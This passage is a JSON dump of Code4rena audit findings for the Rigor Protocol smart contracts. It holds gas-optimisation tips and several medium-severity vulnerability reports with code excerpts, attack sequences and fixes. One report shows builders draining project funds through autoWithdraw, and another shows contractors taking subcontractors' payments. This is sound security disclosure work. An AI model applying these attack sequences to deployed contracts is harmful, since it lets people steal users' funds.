1 ,\"Initialized\");\n\trequire (a < 5 , \"Initialized\");\n\treturn a + 2;\n}\n```\n\n**Execution cost**<br>\n21609 with optimization and split require<br>\n21968 without optimization and using split require\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-05-splitting-require-statements-that-use--saves-gas---saves-8-gas-per-",
      "tags": [],
      "finders": []
    },
    {
      "id": "5091",
      "title": "[G-04] ++x is more efficient than x++(Saves \\~6 gas)",
      "impact": "GAS",
      "content": "\nFile: Community.sol [Line 140](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L140)<br>\nAverage gas when using communityCount++ : 176852<br>\nAverage gas when using ++communityCount : 176846<br>\n\n```solidity\n        communityCount++;\n```\n\n**Other Instances**<br>\nFile: Disputes.sol [Line 121](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Disputes.sol#L121)\n\n```solidity\n        emit DisputeRaised(disputeCount++, _reason);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-04-x-is-more-efficient-than-xsaves-6-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5090",
      "title": "[G-03] ++i costs less gas compared to i++ or i += 1 in for loops (\\~5 gas per iteration)",
      "impact": "GAS",
      "content": "\n\\++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\ni++ increments i and returns the initial value of i. Which means:\n\n    uint i = 1;  \n    i++; // == 1 but i == 2  \n\nBut ++i returns the actual incremented value:\n\n    uint i = 1;  \n    ++i; // == 2 and i == 2 too, so no need for a temporary variable  \n\nIn the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2\n\nInstances include:\n\nFile: HomeFiProxy.sol [line 87](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFiProxy.sol#L87-L89)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n            _generateProxy(allContractNames[i], _implementations[i]);\n        }\n```\n\nFile: HomeFiProxy.sol [line 136](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFiProxy.sol#L136-L138)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n            _replaceImplementation(_contractNames[i], _contractAddresses[i]);\n        }\n```\n\nFile: Project.sol [Line 248](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L248)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n```\n\nFile: Project.sol [Line 311](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L311-L313)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n            _inviteSC(_taskList[i], _scList[i], false);\n        }\n```\n\nFile: Project.sol [Line 322](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L322)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) {\n```\n\nFile: Tasks.sol [Line 181](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/libraries/Tasks.sol#L181)\n\n```solidity\n        for (uint256 i = 0; i < _length; i++) _alerts[i] = _self.alerts[i];\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-03-i-costs-less-gas-compared-to-i-or-i--1-in-for-loops-5-gas-per-iteration",
      "tags": [],
      "finders": []
    },
    {
      "id": "5089",
      "title": "[G-02] Cache the length of arrays in loops",
      "impact": "GAS",
      "content": "\nThe solidity compiler will always read the length of the array during each iteration. That is,\n\n1.if it is a storage array, this is an extra sload operation (**100 additional extra gas (EIP-2929 2) for each iteration except for the first**),<br>\n2.if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first),<br>\n3.if it is a calldata array, this is an extra calldataload operation (3 additional gas for each iteration except for the first)<br>\n\nThis extra costs can be avoided by caching the array length (in stack):\n\nHere, I suggest storing the arrayâ€™s length in a variable before the for-loop, and use it instead:\n\nFile: Project.sol [Line 603](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L603)\n\n### Project.sol.allocateFunds(): \\_changeOrderedTask.length should be cached - \\_changeOrderedTask is a storage array\n\n```solidity\n            for (; i < _changeOrderedTask.length; i++) {\n```\n\nThis optimization is especially important if it is a storage array as it's our case here.\n\n**The above should be modified to**\n\n```solidity\n\tuint256 length = _changeOrderedTask.length;\n            for (; i < length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-02-cache-the-length-of-arrays-in-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "5088",
      "title": "[G-01] Cache storage values in memory to minimize SLOADs",
      "impact": "GAS",
      "content": "\nThe code can be optimized by minimising the number of SLOADs. SLOADs are expensive 100 gas compared to MLOADs/MSTOREs(3gas)<br>\nStorage value should get cached in memory\n\nFile: HomeFi.sol [Line 228](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFi.sol#L210-L232)\n\n### HomeFi.sol.createProject(): projectCount should be cached(Saves \\~ 71 gas)\n\nAverage gas before caching = 339543<br>\nAverage  gas after caching =   339472<br>\n\n```solidity\n    function createProject(bytes memory _hash, address _currency)\n        external\n        override\n        nonReentrant\n    {\n        // Revert if currency not supported by HomeFi\n        validCurrency(_currency);\n   // Update project related mappings\n        projects[projectCount] = _project;  @audit: SLOAD 1\n        projectTokenId[_project] = projectCount; @audit: SLOAD 2\n\n\n        emit ProjectAdded(projectCount, _project, _sender, _currency, _hash); @audit: SLOAD 3\n    }\n```\n\n**projectCount** is being read 3 times in the following lines\n\nSLOAD 1 [Line 228](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFi.sol#L228)<br>\nSLOAD 2 [Line 229](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFi.sol#L229)<br>\nSLOAD 3 [Line 231](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFi.sol#L231)<br>\n\nFile: HomeFi.sol [Line 284-297](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/HomeFi.sol#L284-L297)\n\n### HomeFi.sol.mintNFT(): projectCount should be cached\n\n```solidity\n    function mintNFT(address _to, string memory _tokenURI)\n        internal\n        returns (uint256)\n    {\n        // Project count starts from 1\n        projectCount += 1;\n\n\n        // Mints NFT and set token URI\n        _mint(_to, projectCount);\n        _setTokenURI(projectCount, _tokenURI);\n\n\n        emit NftCreated(projectCount, _to);\n        return projectCount;\n    }\n```\n\nFile: Project.sol [Line 176&179](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L162-L182)\n\n### Project.sol.updateProjectHash(): hashChangeNonce should be cached (saves \\~ 101 gas)\n\nAverage gas before caching = 54538<br>\nAverage  gas after caching =   54437<br>\n\n```solidity\n    function updateProjectHash(bytes calldata _data, bytes calldata _signature)\n        external\n        override\n    {\n        // Revert if decoded nonce is incorrect. This indicates wrong _data.\n        require(_nonce == hashChangeNonce, \"Project::!Nonce\"); @audit - SLOAD 1\n        // Increment to ensure a set of data and signature cannot be re-used.\n        hashChangeNonce += 1;@audit - SLOAD 2 and \n        emit HashUpdated(_hash);\n    }\n```\n\nIn the above function, there are two SLOADS that can be replaced with a cached variable.<br>\nSLOAD 1: [Line 176](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L176)<br>\nSLOAD 2: [Line 179](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L179)<br>\n\nFile: Project.sol [Line 277&290](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L266-L293)\n\n### Project.sol.updateTaskHash(): hashChangeNonce should be cached(saves \\~ 98 gas)\n\nAverage gas before caching = 58185<br>\nAverage  gas after caching =   58087<br>\n\n```solidity\n    function updateTaskHash(bytes calldata _data, bytes calldata _signature)\n        external\n        override\n    {\n        // Decode params from _data\n        (bytes memory _taskHash, uint256 _nonce, uint256 _taskID) = abi.decode(\n            _data,\n            (bytes, uint256, uint256)\n        );\n        // Revert if decoded nonce is incorrect. This indicates wrong data.\n        require(_nonce == hashChangeNonce, \"Project::!Nonce\");\n       // Increment to ensure a set of data and signature cannot be re-used.\n        hashChangeNonce += 1;\n        emit TaskHashUpdated(_taskID, _taskHash);\n    }\n```\n\nIn the above function, there are two SLOADS that can be replaced with a cached variable.<br>\nSLOAD 1: [Line 277](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L277)<br>\nSLOAD 2: [Line 290](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L290)<br>\n\nFile: Project.sol [Line 591-604](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L591-L604)\n\n### Project.sol.allocateFunds():\\_changeOrderedTask.length should be cached(Saves \\~ 118 gas)\n\nAverage gas before caching = 63493<br>\nAverage  gas after caching =   63295<br>\n\n```solidity\n        uint256[] memory _tasksAllocated = new uint256[](\n            taskCount - j + _changeOrderedTask.length - i @audit - SLOAD 1\n        );\n   // Number of times a loop has run.\n        uint256 _loopCount;\n        /// CHANGE ORDERED TASK FUNDING ///\n        // Any tasks added to _changeOrderedTask will be allocated first\n        if (_changeOrderedTask.length > 0) { @audit - SLOAD 2\n            // Loop from lastAllocatedChangeOrderTask to _changeOrderedTask length (until _maxLoop)\n            for (; i < _changeOrderedTask.length; i++) { @audit - Another SLOAD ;read repeatedly inside the loop\n                // Local instance of task cost. To save gas.\n\t\t\t\t\n\t\t//truncated a big chunk of code here\n635:   if (i == _changeOrderedTask.length) { @audit - another SLOAD\n```\n\nSLOAD 1: [Line 592](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L592)<br>\nSLOAD 2: [Line 610](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L601)<br>\nSLOAD 3: Read inside a for loop [Line 603](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L603)<br>\nSLOAD 4: [Line 635](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Project.sol#L635)<br>\nIn the above function, the gas estimate might be higher than indicated due the SLOAD inside the  for loop\n\nFile: Community.sol [Line 143 & 150](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L143-L151)\n\n### Community.sol.createCommunity():communityCount should be cached( Saves \\~186 gas)\n\nAverage gas before caching = 176852<br>\nAverage  gas after caching =   176666<br>\n\n```solidity\n   140: communityCount++; //@audit - SLOAD 1 + SSTORE(communityCount)\n\n\n        // Store community details\n   143: CommunityStruct storage _community = _communities[communityCount]; @audit - SLOAD 2(communityCount)\n        _community.owner = _sender;\n        _community.currency = IDebtToken(_currency);\n\t\t      ...\n         @ audit - Truncated some bit of code here\n   150: emit CommunityAdded(communityCount, _sender, _currency, _hash);@audit - SLOAD 3(communityCount)\n    }\n```\n\nSLOAD 1: [Line 140](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L140)<br>\nSLOAD 2: [Line 143](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L143)<br>\nSLOAD 3: [Line 150](https://github.com/code-423n4/2022-08-rigor/blob/b17b2a11d04289f9e927c71703b42771dd7b86a4/contracts/Community.sol#L150)<br>\nNote, after creating a **temp** variable in the above , for line 140, after incrementing the temp variable we need to assign the temp value to **communityCount**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "#g-01-cache-storage-values-in-memory-to-minimize-sloads",
      "tags": [],
      "finders": []
    },
    {
      "id": "3124",
      "title": "[M-20] `Project.sol` and `Community.sol` have no way to revoke a hash in approvedHashes",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x52_\n\n[Community.sol#L501-L506](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L501-L506)<br>\n[Project.sol#L108-L115](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108-L115)<br>\n\nUser is unable to revoke previously approved hash.\n\n### Proof of Concept\n\nIf user reconsiders or notices something malicious about the hash after signing, they should be able to revoke the hash. For example the user approves a hash only to find out later that the hash has been spoofed and they weren't approving what they thought they were. To protect themselves the user should be able to revoke approval, otherwise it may lead to loss of funds or access.\n\n### Recommended Mitigation Steps\n\nAdd the following function:\n\n    function revokeHash(bytes32 _hash) external virtual {\n        approvedHashes[_msgSender()][_hash] = false;\n    }\n\n**[parv3213 (Rigor) disputed and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/64#issuecomment-1243284914):**\n > I do not find it essential to revoke a hash. As off-chain signatures can never be marked as invalid, adding this feature for on-chain signatures makes no sense. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that prevents users from revoking a previously approved hash. This means that if the user reconsiders or notices something malicious about the hash after signing, they are not able to revoke it. This could lead to loss of funds or access. To mitigate this issue, the report recommends adding a function called revokeHash which will allow users to revoke the hash. The code for the function is provided in the report.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/64",
      "tags": [
        "Business Logic",
        "Access Control"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3123",
      "title": "[M-19] `changeOrder` requires subcontractor signature when the subcontractor address is 0",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda_\n\n[Project.sol#L402](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L402)<br>\n[Project.sol#L485](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L485)<br>\n\nVia `changeOrder`, it is possible to set the subcontractor address to 0 (and it is zero when no one is invited). However, when it is updated later again, a signature of the \"current subcontractor\" (in this case `address(0)`) is still required. This is in contrast to contractors, where the signature is only required when the contractor address is non-zero.\n\n### Proof Of Concept\n\n1.) Task 1 is assigned to the subcontractor Bob.<br>\n2.) `changeOrder` with Bob's signature is used to assign task 1 temporarily to address 0 while a new subcontractor is searched.<br>\n3.) The price of the task should be changed, which requires the signature of the \"current subcontractor\" (i.e., `address(0)`)<br>\n\nTo be fair, because `SignatureDecoder.recoverKey` returns `address(0)` for invalid signatures, an invalid signature could in theory be submitted in step 3. But I do not assume that this is really intended (for instance, there is also the check in `checkSignatureTask`, although one could simply use an invalid signature when it is `address(0)`) and a design that requires the user to submit invalid signatures in certain scenarios would also be very poor in my opinion.\n\n### Recommended Mitigation Steps\n\nCheck if the subcontractor address is zero, do not require a valid signature in such cases.\n\n**[parv3213 (Rigor) acknowledged](https://github.com/code-423n4/2022-08-rigor-findings/issues/85)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a code project which is hosted on Github. The vulnerability is related to the `changeOrder` function, which is used to assign tasks to subcontractors. When a task is assigned to the subcontractor address 0, it is possible to change the price of the task without requiring a valid signature. This could be exploited by malicious users to manipulate the project and cause financial loss.\n\nThe recommended mitigation step for this issue is to check if the subcontractor address is zero, and if it is, do not require a valid signature. This should prevent malicious users from exploiting this vulnerability and manipulating the project.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/85",
      "tags": [],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "3122",
      "title": "[M-18] Task Functionality completely sidestepped via `autoWithdraw`",
      "impact": "MEDIUM",
      "content": "_Submitted by GalloDaSballo_\n\n[Project.sol#L770](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L770)<br>\n\n`autoWithdraw` will send funds to the `builder`, we can use this knowledge to drain all funds from `Project` to the builder contract. Completely sidestepping the whole Task based logic.\n\n### Impact\n\nThrough creation and deletion of tasks, leveraging `autoWithdraw` which will always send the funds to be `builder`, even when origin was the Community, a builder can cycle out all funds out of the Project Contract and transfer them to themselves.\n\nUltimately this breaks the trust assumptions and guarantees of the Task System, as the builder can now act as they please, the Project contract no longer holding any funds is limited.\n\nOnly aspect that diminishes impact is that the system is based on Credit (uncollateralized /undercollateralized lending), meaning the Builder wouldn't be \"committing a crime\" in taking ownership of all funds.\n\nHowever the system invariants used to offer completely transparent accounting are now bypassed in favour of \"trusting the builder\".\n\n### Proof of Concept\n\nWe know we can trigger `autoWithdraw` it by creating and allocating a task, and then reducing it's cost\n\n```solidity\n            // If tasks are already allocated with old cost.\n            if (tasks[_taskID].alerts[1]) {\n                // If new task cost is less than old task cost.\n                if (_newCost < _taskCost) {\n                    // Find the difference between old - new.\n                    uint256 _withdrawDifference = _taskCost - _newCost;\n\n                    // Reduce this difference from total cost allocated.\n                    // As the same task is now allocated with lesser cost.\n                    totalAllocated -= _withdrawDifference;\n\n                    // Withdraw the difference back to builder's account.\n                    // As this additional amount may not be required by the project.\n                    autoWithdraw(_withdrawDifference);\n                } else if (totalLent - _totalAllocated >= _newCost - _taskCost) {\n```\n\nTo funnel the funds we can:\n\n*   Create a new Task with Cost X (call `addTasks`)\n*   Allocate to it (call `allocateFunds`)\n*   `changeOrder` to trigger the condition `if (_newCost < _taskCost) {` and receive the delta of tokens\n\nRepeat until all funds are funneled into the `builder` wallet.\n\nThe reason why the builder can do this is because in all functions involved:\n\n*   [`addTasks`](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L218-L228)\n*   [`changeOrder`](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L400-L404)\n\nonly the `builder` signature is necessary, meaning the contract is fully trusting the `builder`\n\n#### Example Scenario\n\n*   Builder funnels the funds out\n*   Builder makes announcement: \"Funds are safu, we'll update once we know what to do next\"\n*   Builder follows up: \"We will use twitter to post updates on the project\"\n*   Entire system is back to being opaque, making the system pointless\n\n### Recommended Mitigation Steps\n\nBelow are listed two options for mitigation\n\n*   A) Consider removing `autoWithdraw` (keep funds inside of project), create a separate multi-sig like way to withdraw\n*   B) Keep a split between funds sent by Builder and by Community, and make `autoWithdraw` send the funds back accordingly (may also need to re-compute total sent in Community)\n\n**[parv3213 (Rigor) acknowledged and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/281#issuecomment-1212006518):**\n > Users in our system are KYC'ed, whitelisted, and trusted. We are certain that they won't misuse this feature.\n\n**[Jack the Pug (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/281#issuecomment-1229151906):**\n > The issue makes a lot of sense to me, from the security perspective, the system should have as minimal trust as possible. The recommended remediation also makes sense.\n> \n> I'm not sure about the High severity though. It's more like a Medium to me.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the `autoWithdraw` function in the `Project` contract. The function allows builders to send funds to themselves, sidestepping the task-based logic and draining all funds from the project contract. This breaks the trust assumptions and guarantees of the task system by allowing the builder to act as they please and not having the project contract holding any funds. The vulnerability can be exploited by creating and allocating a task, and then reducing its cost. This process can be repeated until all funds are funneled into the builder's wallet. The reason why the builder can do this is because the contract only requires the builder's signature in all functions involved. An example scenario of this vulnerability could be the builder funnels the funds out, makes an announcement that the funds are safe, and then follows up with using Twitter to post updates on the project. This makes the system opaque and pointless. Two possible options for mitigating this vulnerability are to either remove the `autoWithdraw` function and create a separate multi-sig like way to withdraw, or to keep a split between funds sent by the builder and by the community and make `autoWithdraw` send the funds back accordingly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/281",
      "tags": [],
      "finders": [
        "GalloDaSballo"
      ]
    },
    {
      "id": "3121",
      "title": "[M-17] Malicious delegated contractor can block funding tasks or mark tasks as complete",
      "impact": "MEDIUM",
      "content": "_Submitted by indijanc_\n\n[Project.sol#L219](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L219)<br>\n[Project.sol#L655](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L655)<br>\n[Project.sol#L807](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L807)<br>\n\nA malicious delegated contractor can add a huge number of tasks (or one task with a huge cost). This would then pose problems in `allocateFunds()` as tasks could not be funded. Builder could remove delegation for the contractor but couldn't replace the contractor and so couldn't remove the malicious contractor. The contractor is required to sign various state changes in `Project.sol`. A delegated contractor can also for example complete tasks which results in transferring funds to subcontractors.\n\nThis sounds very problematic and would be critical, but reading through the documentation and the code, I'm assuming there is certain trust incorporated and required for the system to work. Hence I'm assuming the system considers a delegated contractor is trustworthy as is the builder. So while the impact may be big I consider the likelihood quite small.\n\n### Proof of Concept\n\nWhen a contractor is delegated, various operations only need his signature.<br>\n[Project.sol L807](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L807)\n\n### Tools Used\n\nVisual Studio Code\n\n### Recommended Mitigation Steps\n\nThere's a couple of improvements you could consider:\n\n1.  Create a function to update `lastAllocatedTask`. This could be restricted to `Disputes` contract or the builder. This could be used against maliciously inserted tasks.\n2.  Add functionality for `Disputes` contract to be able to remove or replace the contractor. This would be a guard against malicious contractors.\n\n**[parv3213 (Rigor) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-08-rigor-findings/issues/320)**\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/320#issuecomment-1229189630):**\n > I like this finding, but this is probably a design choice. The suggestions make sense to me. I'll keep this as a Medium.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project on GitHub. The vulnerability is that a malicious delegated contractor can add a huge number of tasks or one task with a huge cost, which could then pose problems in the `allocateFunds()` function as tasks could not be funded. The builder could remove delegation for the contractor, but couldn't replace the contractor and so couldn't remove the malicious contractor. The contractor is required to sign various state changes in `Project.sol`. The impact of this vulnerability may be big, but due to certain trust incorporated and required for the system to work, the likelihood of it happening is quite low.\n\nThe bug was identified using Visual Studio Code. To mitigate this, two steps have been recommended: first, creating a function to update `lastAllocatedTask`, which could be restricted to `Disputes` contract or the builder, and second, adding functionality for `Disputes` contract to be able to remove or replace the contractor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/320",
      "tags": [],
      "finders": [
        "indijanc"
      ]
    },
    {
      "id": "3120",
      "title": "[M-16] New subcontractor can be set for a SCConfirmed task without current subcontractor consent",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by hansfriese_\n\nMalicious builder/contractor can change the subcontractor for any task even if all the terms was agreed upon and work was started/finished, but the task wasn't set to completed yet, i.e. it's `SCConfirmed`, `getAlerts(_taskID)[2] == true`. This condition is not checked by inviteSC().\n\nFor example, a contractor can create a subcontractor of her own and front run valid setComplete() call with a sequence of `inviteSC(task, own_subcontractor) -> setComplete()` with a signatory from the `own_subcontractor`, stealing the task budget from the subcontractor who did the job. Contractor will not breach any duties with the community as the task will be done, while raiseDispute() will not work for a real subcontractor as the task record will be already changed.\n\nSetting the severity to be high as this creates an attack vector to fully steal task budget from the subcontractor as at the moment of any valid setComplete() call the task budget belongs to subcontractor as the job completion is already verified by all the parties.\n\n### Proof of Concept\n\ninviteSC() requires either builder or contractor to call for the change and verify nothing else:\n\n[Project.sol#L295-L316](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L295-L316)<br>\n\n```solidity\n    /// @inheritdoc IProject\n    function inviteSC(uint256[] calldata _taskList, address[] calldata _scList)\n        external\n        override\n    {\n        // Revert if sender is neither builder nor contractor.\n        require(\n            _msgSender() == builder || _msgSender() == contractor,\n            \"Project::!Builder||!GC\"\n        );\n\n        // Revert if taskList array length not equal to scList array length.\n        uint256 _length = _taskList.length;\n        require(_length == _scList.length, \"Project::Lengths !match\");\n\n        // Invite subcontractor for each task.\n        for (uint256 i = 0; i < _length; i++) {\n            _inviteSC(_taskList[i], _scList[i], false);\n        }\n\n        emit MultipleSCInvited(_taskList, _scList);\n    }\n```\n\n\\_inviteSC() only checks non-zero address and calls inviteSubcontractor():\n\n[Project.sol#L747-L762](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L747-L762)<br>\n\n```solidity\n    function _inviteSC(\n        uint256 _taskID,\n        address _sc,\n        bool _emitEvent\n    ) internal {\n        // Revert if sc to invite is address 0\n        require(_sc != address(0), \"Project::0 address\");\n\n        // Internal call to tasks invite contractor\n        tasks[_taskID].inviteSubcontractor(_sc);\n\n        // If `_emitEvent` is true (called via changeOrder) then emit event\n        if (_emitEvent) {\n            emit SingleSCInvited(_taskID, _sc);\n        }\n    }\n```\n\ninviteSubcontractor() just sets the new value:\n\n[Tasks.sol#L106-L111](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L106-L111)<br>\n\n```solidity\n    function inviteSubcontractor(Task storage _self, address _sc)\n        internal\n        onlyInactive(_self)\n    {\n        _self.subcontractor = _sc;\n    }\n```\n\nTask is paid only on completion by setComplete():\n\n[Project.sol#L349-L356](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L349-L356)<br>\n\n```solidity\n        // Mark task as complete. Only works when task is active.\n        tasks[_taskID].setComplete();\n\n        // Transfer funds to subcontractor.\n        currency.safeTransfer(\n            tasks[_taskID].subcontractor,\n            tasks[_taskID].cost\n        );\n```\n\nThis way the absence of `getAlerts(_taskID)[2]` check and checkSignatureTask() call in inviteSC() provides a way for builder or contractor to steal task budget from a subcontractor.\n\n### Recommended Mitigation Steps\n\nConsider calling checkSignatureTask() when `getAlerts(_taskID)[2]` is true, schematically:\n\n[Project.sol#L310-L313](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L310-L313)<br>\n\n```solidity\n        // Invite subcontractor for each task.\n        for (uint256 i = 0; i < _length; i++) {\n+           if (getAlerts(_taskList[i])[2])\n+               checkSignatureTask(_data_with_scList[i], _signature, _taskList[i]);        \n            _inviteSC(_taskList[i], _scList[i], false);\n        }\n```\n\nThis approach is already implemented in changeOrder() where `_newSC` is a part of hash that has to be signed by all the parties:\n\n[Project.sol#L386-L403](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L403)<br>\n\n```solidity\n    function changeOrder(bytes calldata _data, bytes calldata _signature)\n        external\n        override\n        nonReentrant\n    {\n        // Decode params from _data\n        (\n            uint256 _taskID,\n            address _newSC,\n            uint256 _newCost,\n            address _project\n        ) = abi.decode(_data, (uint256, address, uint256, address));\n\n        // If the sender is disputes contract, then do not check for signatures.\n        if (_msgSender() != disputes) {\n            // Check for required signatures.\n            checkSignatureTask(_data, _signature, _taskID);\n        